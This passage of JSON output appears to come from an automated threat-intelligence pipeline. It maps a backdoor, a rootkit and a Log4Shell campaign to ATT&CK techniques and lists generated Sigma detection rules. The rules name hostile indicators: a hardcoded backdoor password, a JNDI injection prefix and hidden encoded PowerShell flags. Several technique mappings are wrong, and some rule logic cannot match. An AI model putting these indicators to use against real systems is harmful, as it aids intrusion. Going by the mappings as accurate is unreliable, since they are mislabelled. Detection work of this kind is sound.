            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "Credential Dumping",
            "attack_id": "T1215",
            "tactic": "Credential Access",
            "description": "The backdoor creates a new administrator user on the system with a hardcoded password, MileSt0ne2@16.",
            "confidence_score": 0.68,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.345,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "ANONYMOUS",
              "MileSt0ne2@16"
            ],
            "tools": [
              "net",
              "backdoor",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "sc",
              "xor",
              "zip",
              "at",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "166f7e3f-bae4-4888-9cc3-d189198b635f",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "Phishing",
            "attack_id": "T1566",
            "tactic": "Initial Access",
            "description": "The attacker uses digitally signed certificates from game development companies to sign the rootkit drivers.",
            "confidence_score": 0.68,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.345,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Frostburn Studios",
              "433CCR Company"
            ],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "rootkit",
              "sc",
              "xor",
              "zip",
              "at",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "f45124ae-7ca5-4d24-a9d0-612f197037c8",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "Detected Command and Scripting Interpreter activity via NLP pattern matching",
            "confidence_score": 0.679,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.86,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "sc",
              "xor",
              "zip",
              "at",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "1fa4bd26-d320-4c8e-bfc1-811da4d5be0b",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "Exploitation for Client Execution",
            "attack_id": "T1190",
            "tactic": "Execution",
            "description": "Deep Panda exploited the Log4Shell vulnerability in VMware Horizon servers to gain initial access",
            "confidence_score": 0.676,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.322,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Log4Shell",
              "VMware Horizon"
            ],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "sc",
              "xor",
              "zip",
              "at",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "25e81813-cf53-4f52-863d-79270a069888",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "Modify Registry",
            "attack_id": "T1112",
            "tactic": "Defense Evasion",
            "description": "The dropper uses IOCTLs to hide the driver's registry key",
            "confidence_score": 0.674,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.268,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "0xF3060010",
              "0xF3060014",
              "Sfdev32TopInstance"
            ],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "Dropper",
              "netstat",
              "powershell",
              "reg",
              "sc",
              "xor",
              "zip",
              "at",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "1622fb48-2411-4ef3-9955-2f63b0c0644e",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "Screen Capture",
            "attack_id": "T1113",
            "tactic": "Collection",
            "description": "Detected Screen Capture activity via NLP pattern matching",
            "confidence_score": 0.672,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.139,
              "tool_mentions": 1.0,
              "context_richness": 0.86,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "sc",
              "xor",
              "zip",
              "at",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "fe2e23c2-9de9-47de-8287-20fc960be7ad",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "Pre-OS Boot",
            "attack_id": "T1542",
            "tactic": "Persistence",
            "description": "The rootkit uses Direct Kernel Object Modification (DKOM) to modify kernel structures and objects.",
            "confidence_score": 0.67,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.322,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "DKOM"
            ],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "rootkit",
              "sc",
              "xor",
              "zip",
              "at",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "54a6053d-e9be-4152-975b-081baf542ae9",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "Modify Registry",
            "attack_id": "T1112",
            "tactic": "Persistence",
            "description": "The backdoor created a service entry directly in the registry",
            "confidence_score": 0.668,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.268,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "msupdate2",
              "%APPDATA%\\newdev.dll"
            ],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "sc",
              "xor",
              "zip",
              "at",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "6e4b9274-bfd0-4c5a-a9c5-1ea84e7a62b8",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "Indicator Removal on Host",
            "attack_id": "T1070",
            "tactic": "Defense Evasion",
            "description": "The script deleted files from the disk after execution",
            "confidence_score": 0.665,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.207,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "1.bat",
              "syn.exe",
              "1.dll"
            ],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "sc",
              "xor",
              "zip",
              "at",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "c61551ad-3c9b-45d6-81bf-725b3d6e111a",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "Obfuscated Files or Information",
            "attack_id": "T1027",
            "tactic": "Defense Evasion",
            "description": "Detected Obfuscated Files or Information activity via NLP pattern matching",
            "confidence_score": 0.664,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "sc",
              "xor",
              "zip",
              "at",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "732f50a6-262a-48a6-94f5-e2968ff181c9",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "Exfiltration Over C2 Channel",
            "attack_id": "T1041",
            "tactic": "Exfiltration",
            "description": "Detected Exfiltration Over C2 Channel activity via NLP pattern matching",
            "confidence_score": 0.664,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "sc",
              "xor",
              "zip",
              "at",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "5630e1a8-69d7-408f-9d0f-198103ef2969",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "Exploit Public-Facing Application",
            "attack_id": "T1190",
            "tactic": "Initial Access",
            "description": "Detected Exploit Public-Facing Application activity via NLP pattern matching",
            "confidence_score": 0.661,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "sc",
              "xor",
              "zip",
              "at",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "744cb804-f920-4920-9373-b5a86ca36b1f",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "Virtualization/Sandbox Evasion",
            "attack_id": "T1497",
            "tactic": "Defense Evasion",
            "description": "The rootkit implements a filesystem minifilter to evade detection",
            "confidence_score": 0.659,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.207,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "IRP_MJ_DIRECTORY_CONTROL",
              "IRP_MN_QUERY_DIRECTORY"
            ],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "sc",
              "xor",
              "zip",
              "at",
              "Rootkit",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "62fddfe2-5635-4cb9-96a4-1725d446af74",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "User Execution",
            "attack_id": "T1204",
            "tactic": "Execution",
            "description": "The attacker may use user execution to run malicious commands",
            "confidence_score": 0.656,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.23,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "CMD"
            ],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "sc",
              "xor",
              "zip",
              "at",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "66be8c2b-305d-40a2-ba24-8af3a7d56742",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "Create or Modify System Process",
            "attack_id": "T1543",
            "tactic": "Persistence",
            "description": "Detected Create or Modify System Process activity via NLP pattern matching",
            "confidence_score": 0.64,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.246,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "sc",
              "xor",
              "zip",
              "at",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "b6c248b5-b539-4c59-befd-3cbaec014427",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "Application Layer Protocol",
            "attack_id": "T1071",
            "tactic": "Command And Control",
            "description": "Detected Application Layer Protocol activity via NLP pattern matching",
            "confidence_score": 0.633,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.199,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "sc",
              "xor",
              "zip",
              "at",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "aafd1eaa-c5f2-467a-a060-55823500ccd5",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "Archive Collected Data",
            "attack_id": "T1560",
            "tactic": "Collection",
            "description": "Detected Archive Collected Data activity via NLP pattern matching",
            "confidence_score": 0.628,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "sc",
              "xor",
              "zip",
              "at",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "d8b5d63c-bb99-4527-a10a-86dacba15f40",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "Registry Run Keys",
            "attack_id": "T1547.001",
            "tactic": "Persistence",
            "description": "Detected Registry Run Keys activity via NLP pattern matching",
            "confidence_score": 0.623,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.5,
              "description_detail": 0.199,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "sc",
              "xor",
              "zip",
              "at",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "nlp_indicator"
          }
        ]
      }
    ]
  },
  "rules": {
    "rules": [
      {
        "title": "Detect CreateProcessAsUser with suspicious credential indicators",
        "description": "Detects execution of CreateProcessAsUser via command line that includes the strings ANONYMOUS and MileSt0ne2@16, indicating an attempt to create a privileged account and run a backdoor with elevated privileges.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection1": {
            "CommandLine|contains": "CreateProcessAsUser"
          },
          "selection2": {
            "CommandLine|contains": "ANONYMOUS"
          },
          "selection3": {
            "CommandLine|contains": "MileSt0ne2@16"
          },
          "condition": "selection1 and selection2 and selection3"
        },
        "falsepositives": [
          "Legitimate administrative scripts or deployment tools that use CreateProcessAsUser with internal identifiers",
          "System management utilities that may include the word ANONYMOUS in logging or comments"
        ],
        "level": "high",
        "tags": [
          "attack.execution",
          "attack.t1059"
        ],
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "generation_method": "langchain",
        "id": "15c89d1f-75c6-449d-8a6c-1893d8f6758b",
        "siem_verification": {
          "detected": false,
          "status": "success",
          "message": "Verification complete",
          "events_found": 0,
          "query_time_ms": 343.0
        }
      },
      {
        "title": "Rootkit Installation via Process Creation or Service Configuration",
        "description": "Detects process creation events indicative of rootkit installation through service creation or command line patterns.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_sc": {
            "Image|endswith": "\\sc.exe",
            "CommandLine|contains": "rootkit"
          },
          "selection_generic": {
            "CommandLine|contains": "rootkit"
          },
          "condition": "selection_sc or selection_generic"
        },
        "falsepositives": [
          "Legitimate security tools referencing rootkits in command lines",
          "Administrative scripts using 'rootkit' terminology for testing"
        ],
        "level": "high",
        "tags": [
          "attack.defense_evasion",
          "attack.t1014"
        ],
        "ttp_id": "unknown",
        "technique_name": "Rootkit",
        "generation_method": "langchain",
        "id": "d74e2ed1-19a9-4180-bd1c-a6b1c464d697",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete",
          "events_found": 2,
          "query_time_ms": 1843.0
        }
      },
      {
        "title": "Suspicious PowerShell Execution Patterns",
        "description": "Detects PowerShell execution with suspicious command line arguments and unexpected parent processes",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains|all": [
              " -enc ",
              " -EncodedCommand ",
              " -ExecutionPolicy Bypass ",
              " -WindowStyle Hidden ",
              " -NonInteractive"
            ]
          },
          "filter": {
            "ParentImage|endswith|any": [
              "\\explorer.exe",
              "\\svchost.exe",
              "\\cmd.exe"
            ]
          },
          "condition": "selection and not filter"
        },
        "falsepositives": [
          "Legitimate system administration scripts using encoded commands",
          "DevOps tools that execute PowerShell with bypass parameters"
        ],
        "level": "high",
        "tags": [
          "attack.execution",
          "attack.t1064"
        ],
        "ttp_id": "unknown",
        "technique_name": "PowerShell",
        "generation_method": "langchain",
        "id": "fff3d4dc-bdfd-42a1-a5cd-d281bc582de3",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 24,
          "query_time_ms": 691.0000000000001
        }
      },
      {
        "title": "Detect Reflective Code Loading via Rundll32 and PowerShell",
        "description": "Detects possible reflective DLL loading techniques where malicious code is loaded directly into memory using rundll32.exe or PowerShell with encoded commands, indicating defense evasion via reflective code loading.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection1": {
            "Image|endswith": "\\rundll32.exe",
            "CommandLine|contains": "Reflective"
          },
          "selection2": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "-enc"
          },
          "selection3": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": "rundll32.exe"
          },
          "condition": "selection1 or selection2 or selection3"
        },
        "falsepositives": [
          "Legitimate system administration tasks using rundll32.exe to load Microsoft DLLs.",
          "PowerShell -EncodedCommand used by administrators for scripting or automation.",
          "Cmd.exe invoking rundll32.exe for legitimate Windows utilities."
        ],
        "level": "high",
        "tags": [
          "attack.t1620",
          "attack.defense_evasion",
          "attack.technique_reflective_code_loading"
        ],
        "ttp_id": "unknown",
        "technique_name": "Reflective Code Loading",
        "generation_method": "langchain",
        "id": "89972886-fdae-497f-97e8-a441de008911",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 24,
          "query_time_ms": 746.0
        }
      },
      {
        "title": "Screen Capture via Scripting Tools",
        "description": "Detects screen capture tools executed from command-line or scripting parents, indicating potential sensitive data collection.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": [
              "\\snippingtool.exe",
              "\\greenshot.exe",
              "\\nircmd.exe"
            ]
          },
          "selection_parent": {
            "ParentImage|endswith": [
              "\\cmd.exe",
              "\\powershell.exe",
              "\\wscript.exe",
              "\\cscript.exe",
              "\\mshta.exe"
            ]
          },
          "condition": "selection and selection_parent"
        },
        "falsepositives": [
          "Legitimate administrative scripts using screen capture utilities",
          "Automated testing frameworks capturing screenshots"
        ],
        "level": "high",
        "tags": [
          "attack.t1113",
          "attack.collection"
        ],
        "ttp_id": "unknown",
        "technique_name": "Screen Capture",
        "generation_method": "langchain",
        "id": "6c2fa3dc-5728-43ba-989d-f83ac6cfb88b",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 20,
          "query_time_ms": 255.0
        }
      },
      {
        "title": "File and Directory Discovery via Command Line Utilities",
        "description": "Detects command-line utilities frequently used for file and directory discovery targeting system paths",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": [
              "\\cmd.exe",
              "\\powershell.exe"
            ],
            "CommandLine|contains|all": [
              "/s",
              "/a",
              "/R",
              "system32",
              "%SYSTEMROOT%",
              "ProgramFiles"
            ]
          },
          "filter": {
            "CommandLine|contains": [
              "help",
              "/?"
            ]
          },
          "condition": "selection and not filter"
        },
        "falsepositives": [
          "Legitimate system administration",
          "Inventory scripts",
          "Software installation processes"
        ],
        "level": "medium",
        "tags": [
          "attack.t1083",
          "attack.discovery"
        ],
        "ttp_id": "unknown",
        "technique_name": "File and Directory Discovery",
        "generation_method": "langchain",
        "id": "7d137ceb-9a3f-4252-87e4-054a84eb169a",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 32,
          "query_time_ms": 710.0
        }
      },
      {
        "title": "Suspicious Packed Binary Execution from Temporary Directory",
        "description": "Detects potential packed malware executed from temporary locations via script host processes",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_image": {
            "Image|endswith": ".exe",
            "Image|contains|any": [
              "\\Temp\\",
              "\\AppData\\Local\\Temp\\",
              "\\Temporary Internet Files\\"
            ]
          },
          "selection_parent": {
            "ParentImage|endswith": [
              "mshta.exe",
              "wscript.exe",
              "cscript.exe",
              "rundll32.exe",
              "regsvr32.exe"
            ]
          },
          "condition": "selection_image and selection_parent"
        },
        "falsepositives": [
          "Legitimate software installers/updaters running from temporary directories",
          "Developer tools executing compiled binaries from temp paths"
        ],
        "level": "high",
        "tags": [
          "attack.defense_evasion",
          "attack.t1027.002"
        ],
        "ttp_id": "unknown",
        "technique_name": "Obfuscated Files or Information: Software Packing",
        "generation_method": "langchain",
        "id": "a3d0d0e5-8f42-4d33-b7d5-10cac11400cd",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 92,
          "query_time_ms": 24847.0
        }
      },
      {
        "title": "Gather Victim Host Information via System Discovery Commands",
        "description": "Detects execution of common system information discovery commands (systeminfo, ipconfig, net user, whoami, wmic) which attackers use to gather victim host configuration.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_systeminfo": {
            "Image|endswith": [
              "\\cmd.exe",
              "\\powershell.exe"
            ],
            "CommandLine|contains": "systeminfo"
          },
          "selection_ipconfig": {
            "Image|endswith": [
              "\\cmd.exe",
              "\\powershell.exe"
            ],
            "CommandLine|contains": "ipconfig"
          },
          "selection_whoami": {
            "Image|endswith": [
              "\\cmd.exe",
              "\\powershell.exe"
            ],
            "CommandLine|contains": "whoami"
          },
          "selection_netuser": {
            "Image|endswith": [
              "\\cmd.exe",
              "\\powershell.exe"
            ],
            "CommandLine|contains": "net user"
          },
          "selection_wmic": {
            "Image|endswith": "\\wmic.exe"
          },
          "condition": "selection_systeminfo or selection_ipconfig or selection_whoami or selection_netuser or selection_wmic"
        },
        "falsepositives": [
          "Legitimate system administration scripts that run systeminfo or ipconfig for inventory purposes",
          "Scheduled tasks or startup scripts that query system information",
          "Endpoint management tools (e.g., SCCM, PDQ) that execute these commands remotely",
          "Security or monitoring agents that perform periodic host discovery"
        ],
        "level": "medium",
        "tags": [
          "attack.t1082",
          "attack.discovery",
          "custom.process_creation",
          "custom.windows"
        ],
        "ttp_id": "unknown",
        "technique_name": "Gather Victim Host Information",
        "generation_method": "langchain",
        "id": "3c8081a5-5ea3-4692-8454-299adc0cfef1",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 100,
          "query_time_ms": 541.0
        }
      },
      {
        "title": "Exploit Public-Facing Application via Log4Shell JNDI Injection",
        "description": "Detects execution of Java processes with JNDI LDAP payloads indicative of Log4Shell exploitation and outbound connections from Java processes to external IP addresses.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "jndi_process": {
            "Image|endswith": "\\java.exe",
            "CommandLine|contains": "${jndi:ldap://"
          },
          "external_java_conn": {
            "Image|endswith": "\\java.exe",
            "DestinationIp|contains": "."
          },
          "private_ip1": {
            "DestinationIp|startswith": "10."
          },
          "private_ip2": {
            "DestinationIp|startswith": "192.168."
          },
          "private_ip3": {
            "DestinationIp|startswith": "172.16."
          },
          "condition": "jndi_process or (external_java_conn and not (private_ip1 or private_ip2 or private_ip3))"
        },
        "falsepositives": [
          "Legitimate Java applications that connect to external services (e.g., update servers, cloud APIs).",
          "Developers testing JNDI lookups in a controlled environment.",
          "Java processes that include JNDI strings for configuration purposes."
        ],
        "level": "high",
        "tags": [
          "attack.t1190",
          "attack.initial_access",
          "custom.log4shell",
          "custom.exploit_public_facing_application"
        ],
        "ttp_id": "unknown",
        "technique_name": "Exploit Public-Facing Application",
        "generation_method": "langchain",
        "id": "a0fe41b7-d07b-47cb-a843-39d88f334294",
        "siem_verification": {
          "detected": false,
          "status": "success",
          "message": "Verification complete",
          "events_found": 0,
          "query_time_ms": 359.0
        }
      },
      {
        "title": "Detect Windows Command Shell Execution of Milestone Backdoor",
        "description": "Detects execution of cmd.exe (Windows Command Shell) where the command line includes the Milestone backdoor identifier, indicating potential malicious activity.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "EventID": 1,
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": "milestone"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate administrative scripts that invoke cmd.exe with arguments containing the word \"milestone\" (e.g., internal tooling named Milestone).",
          "Software deployment tools that use cmd.exe to launch installers named with the word Milestone."
        ],
        "level": "high",
        "tags": [
          "attack.t1059.003",
          "attack.execution",
          "attack.command_and_scripting_interpreter",
          "custom.windows",
          "custom.sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter: Windows Command Shell",
        "generation_method": "langchain",
        "id": "83e01888-2900-4a82-b717-9c087909cddf",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 21,
          "query_time_ms": 821.0000000000001
        }
      },
      {
        "title": "System and Network Discovery via Native Utilities",
        "description": "Detects use of system utilities for network connection enumeration and system information gathering",
        "logsource": {
          "category": "network_connection",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": [
              "\\netstat.exe",
              "\\ipconfig.exe",
              "\\powershell.exe"
            ],
            "CommandLine|contains": [
              "netstat",
              "/q",
              "/s",
              "Get-NetTCPConnection",
              "Get-NetIPAddress"
            ]
          },
          "filter": {
            "DestinationIp": "127.0.0.1"
          },
          "condition": "selection and not filter"
        },
        "falsepositives": [
          "Legitimate system administration scripts",
          "Network monitoring tools",
          "PowerShell modules using standard networking cmdlets"
        ],
        "level": "medium",
        "tags": [
          "attack.discovery",
          "attack.t1082"
        ],
        "ttp_id": "unknown",
        "technique_name": "System Information Discovery",
        "generation_method": "langchain",
        "id": "74103df8-373b-4e9e-bd43-8a81980cc36f",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 7,
          "query_time_ms": 997.0
        }
      },
      {
        "title": "Suspicious DLL Loading via rundll32.exe or regsvr32.exe (Potential DLL Side-Loading)",
        "description": "Detects execution of rundll32.exe or regsvr32.exe with a DLL argument that is not located in the trusted System32 directory, indicating possible DLL side-loading and execution flow hijacking.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_rundll": {
            "Image|endswith": "\\rundll32.exe",
            "CommandLine|contains": ".dll"
          },
          "selection_regsvr": {
            "Image|endswith": "\\regsvr32.exe",
            "CommandLine|contains": ".dll"
          },
          "selection_system": {
            "CommandLine|contains": "system32"
          },
          "condition": "(selection_rundll or selection_regsvr) and not selection_system"
        },
